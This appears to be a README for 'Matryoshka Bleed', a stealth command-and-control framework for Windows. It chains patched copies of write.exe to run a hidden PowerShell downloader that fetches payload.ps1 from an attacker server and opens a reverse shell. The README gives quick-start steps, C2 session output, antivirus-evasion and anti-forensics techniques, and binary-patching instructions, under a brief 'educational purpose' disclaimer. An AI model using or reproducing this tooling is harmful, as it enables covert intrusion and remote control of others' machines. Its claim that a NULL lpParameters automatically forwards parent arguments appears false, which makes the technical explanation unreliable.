# Matryoshka-Bleed

**Matryoshka Bleed is a stealth C2 framework leveraging LEPAD (Legacy Parameter Descent) - a novel technique for argument propagation through patched Windows binaries. Achieves reverse shell with zero registry changes and full Windows Defender bypass.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![Windows](https://img.shields.io/badge/Windows-10%2F11-blue.svg)](https://microsoft.com/windows)

---

## A Stealth C2 Framework Based on LEPAD

Matryoshka Bleed is a post-exploitation framework that leverages **LEPAD (Legacy Parameter Descent)** - a novel, undocumented technique for automatic argument propagation through patched Windows binaries.

The result is a fully-featured C2 platform that establishes reverse shells with zero registry modifications, no visible windows, and complete Windows Defender bypass.

---

## Key Features

| Feature | Description |
|---------|-------------|
| LEPAD Technology | Novel argument propagation technique through patched `write.exe` binaries |
| Stealth Execution | No cmd/powershell windows visible during entire chain |
| Defender Bypass | Fully undetected by Microsoft Defender (tested on Win10/Win11) |
| No Registry Changes | Zero forensic artifacts - only binary files on disk |
| Cross-Network | Works across local network and over the internet |
| Full C2 Control | Interactive reverse shell with command execution |
| Self-Healing Chain | Arguments propagate regardless of entry point in chain |

---

## How It Works

### The LEPAD Technique

Legacy Parameter Descent (LEPAD) exploits a behavior in `write.exe` (a legacy Windows binary) where ShellExecuteW is called with `lpParameters` = `NULL`. This causes any command-line arguments given to the binary to be automatically forwarded to the next process in the chain.

### Matryoshka Bleed Chain

client.py
    ↓
4x `write.exe` copies (patched to chain to each other)
gbhzswmmk.exe → whykumqprf.exe → iujrusq.exe → rambrnzkt.exe
                                ↓
                        ImportantUpdate.bat
                                ↓
                        powershell.exe (hidden)
                                ↓
                            payload.ps1
                                ↓
                          REVERSE SHELL
                                ↓
server.py (C2 Controller)
    ├── HTTP Server (port 4444) → hosts payload.ps1
    └── TCP Server (port 5555)  → reverse shell listener

### Chain Properties

| Property | Description |
|----------|-------------|
| Position Independence | Arguments propagate from ANY binary in the chain |
| Self-Healing | Final binary ALWAYS executes with provided arguments |
| Forward Only | Arguments only travel forward, never backward |
| No Modification | Arguments are passed 100% untouched |

---

## Components

| File | Description |
|------|-------------|
| client.py | Deploys the Matryoshka chain on target system |
| server.py | C2 controller with HTTP payload hosting and reverse shell listener |
| ImportantUpdate.bat | Downloader stub (hosted externally) |

---

## Quick Start

### 1. Start the C2 Server (Attacker Machine)

python server.py

Output:

  [*] Server IP: 192.168.50.237
  [*] Reverse shell port: 5555
  [*] Payload URL: http://192.168.50.237:4444/payload.ps1

  [!] READY!
  [!] Type 'help' for commands

C2>

### 2. Deploy the Client (Target Machine)

python client.py

The client will:
- Create 4 copies of `write.exe` with random names
- Patch each copy to chain to the next
- Download ImportantUpdate.bat from the payload server
- Start the chain invisibly

### 3. Interact with the Reverse Shell

C2> list

------------------------------------------------------------
ACTIVE REVERSE SHELLS:
------------------------------------------------------------
  50048e04... | 192.168.50.237 | Last: 01:03:15
------------------------------------------------------------

C2> interact 50048e04

[+] Interacting with 50048e04... (192.168.50.237)
[+] Type 'back' to return, 'exit' to terminate session

LEPAD(50048e04)> whoami
shhxd\fhili

LEPAD(50048e04)> echo "Hijacked!" > C:\Users\Public\test.txt

LEPAD(50048e04)> type C:\Users\Public\test.txt
Hijacked!

---

## Stealth Capabilities

| Feature | Implementation |
|---------|----------------|
| No Visible Windows | `CREATE_NO_WINDOW` + `SW_HIDE` + `-WindowStyle Hidden` |
| Signed Binaries | `write.exe` is Microsoft-signed (copies retain signature) |
| No Registry Artifacts | Unlike LOLBAS techniques, LEPAD leaves zero registry changes |
| No Zone.Identifier | Files created via requests have no mark-of-the-web |
| Legitimate Process Tree | Chain consists of trusted Microsoft binaries |

---

## Technical Deep Dive

### Why LEPAD Works

The original `write.exe` contains this code pattern:
```c
ShellExecuteW(
    `NULL`,           // hwnd
    `NULL`,           // lpOperation  
    L"wordpad.exe", // lpFile ← THIS GETS PATCHED
    `NULL`,           // `lpParameters` ← `NULL` CAUSES PROPAGATION!
    `NULL`,           // lpDirectory
    SW_SHOWNORMAL   // nShowCmd
);
```
When `lpParameters` is `NULL`, Windows automatically forwards any command-line arguments from the parent process to the child process. By patching "wordpad.exe" to another binary, we create an argument forwarding primitive.

### Chain Construction

1. Copy `write.exe` 4 times with random names
2. Patch each copy to launch the next one in sequence
3. Patch the final copy to launch ImportantUpdate.bat
4. Start the first copy - arguments propagate through entire chain

### Why No Registry?

Known LOLBAS techniques for `write.exe` require:
- HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\wordpad.exe
- HKCU\Software\Classes\exefile\shell\open\command

These leave forensic evidence. LEPAD requires NO registry modifications - only file system changes.

---

## ProcMon Evidence
```
01:03:12,5745785  cmd.exe /c "gbhzswmmk.exe"
01:03:12,7953784  gbhzswmmk.exe → whykumqprf.exe
01:03:13,2438736  whykumqprf.exe → iujrusq.exe
01:03:13,7323235  iujrusq.exe → rambrnzkt.exe
01:03:14,6479618  rambrnzkt.exe → cmd.exe /c "ImportantUpdate.bat"
01:03:15,8327159  powershell.exe -WindowStyle Hidden -EncodedCommand "..."
```
**No Defender alerts. No registry changes. Complete stealth.**

---

## Server Commands

| Command | Description |
|---------|-------------|
| `help` | Show available commands |
| `list` | List active reverse shells |
| `interact <id>` | Interact with a specific session |
| `kill <id>` | Terminate a session |
| `killall` | Terminate all sessions |
| `exit` | Shutdown server |

### Interactive Session Commands

| Command | Description |
|---------|-------------|
| `<any command>` | Execute PowerShell command on target |
| `back` | Return to main menu |
| `exit` | Terminate session |

---

## Important Notes

- **Educational purpose only - This tool is for authorized security testing**
- **Windows 10: ``write.exe`` exists natively in C:\Windows\System32\**
- **Windows 11: ``write.exe`` must be copied from Windows 10 (the binary itself is portable)**
- **Network: Ensure firewall allows ports 4444 (HTTP) and 5555 (TCP)**

---

## Requirements

`pip install requests`

Python 3.8+ on both attacker and target machines.

---

## Credits

- Technique: LEPAD (Legacy Parameter Descent)
- Exploit: Matryoshka Bleed - full C2 implementation

---

## License

MIT License

---

For security researchers and red teamers only. Use responsibly.
